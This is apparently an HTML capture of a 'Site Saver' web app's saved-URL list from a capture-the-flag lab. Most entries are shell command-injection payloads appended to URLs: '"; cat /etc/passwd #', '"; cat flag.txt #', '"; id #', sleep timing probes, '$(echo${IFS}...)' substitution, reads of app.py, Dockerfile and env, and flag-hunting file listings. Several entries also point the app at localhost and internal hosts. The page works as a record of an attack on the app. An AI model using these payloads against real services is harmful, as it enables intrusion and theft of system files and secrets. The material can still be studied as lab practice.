                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" aria-current="page" href="/add_url">Add Site </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="/">View Saved Sites</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
<div class="container mt-4">
    <h1>Site Saver</h1>
    <p>
        Save your favorite websites here. We ensure that your URLs are correct by checking them before saving them. Our service sends requests to the URLs you provide to ensure they are valid.
    </p>
    
    


    <a href="/add_url" class="btn btn-primary mb-3">Add URL</a>

    <ul class="list-group">
        
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat flag.txt #
            <form method="post" action="/delete_url/5">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat flag.txt #
            <form method="post" action="/delete_url/8">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://127.0.0.1:5003/add_url
            <form method="post" action="/delete_url/9">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://127.0.0.1:5003/
            <form method="post" action="/delete_url/10">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com
            <form method="post" action="/delete_url/11">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/
            <form method="post" action="/delete_url/12">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/add_url
            <form method="post" action="/delete_url/13">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/
            <form method="post" action="/delete_url/14">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/
            <form method="post" action="/delete_url/15">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.org/
            <form method="post" action="/delete_url/16">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/17">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/18">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/19">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/20">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; sleep 8 #
            <form method="post" action="/delete_url/21">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.org/
            <form method="post" action="/delete_url/22">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; sleep 20 #
            <form method="post" action="/delete_url/23">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; false #
            <form method="post" action="/delete_url/24">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; true #
            <form method="post" action="/delete_url/25">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; printf &#39;\xff\xfe&#39; #
            <form method="post" action="/delete_url/26">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; id #
            <form method="post" action="/delete_url/27">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat /etc/passwd #
            <form method="post" action="/delete_url/28">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat flag.txt #
            <form method="post" action="/delete_url/29">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat /etc/passwd #
            <form method="post" action="/delete_url/30">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; pwd; ls -la; cat flag* /flag* /app/flag* /root/flag* 2&gt;/dev/null #
            <form method="post" action="/delete_url/31">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat app.py #
            <form method="post" action="/delete_url/32">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat Dockerfile; env #
            <form method="post" action="/delete_url/33">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://pwnbbb222.invalid&#34;; echo 200 #
            <form method="post" action="/delete_url/34">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://pwnbbb222.invalid&#34;; echo 200 #
            <form method="post" action="/delete_url/35">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
    </ul>
</div>
</body>
</html>
```
